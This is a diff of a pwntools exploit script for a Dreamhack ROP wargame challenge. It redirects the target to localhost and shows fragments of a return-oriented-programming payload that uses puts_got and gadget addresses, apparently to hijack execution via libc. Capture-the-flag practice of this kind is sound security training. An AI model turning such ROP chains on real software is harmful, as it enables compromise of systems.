@@ -1,7 +1,8 @@
 from pwn import *
 
 #p = process('./rop')
-p = remote('host3.dreamhack.games', '21835')
+p = remote('127.0.0.1', '7182')
+#p = remote('host3.dreamhack.games', '21835')
 e = ELF('./rop')
 libc = ELF('./libc.so.6')
 
@@ -37,7 +38,7 @@ payload += p64(0)
 payload += p64(pop_rdi_ret)
 # read(0, system, puts_got)
 payload += p64(pop_rdi_ret)
-payload += p64(0)
+payload += p64(0)       
 payload += p64(pop_rsi_r15)
 payload += p64(puts_got)
 payload += p64(0)
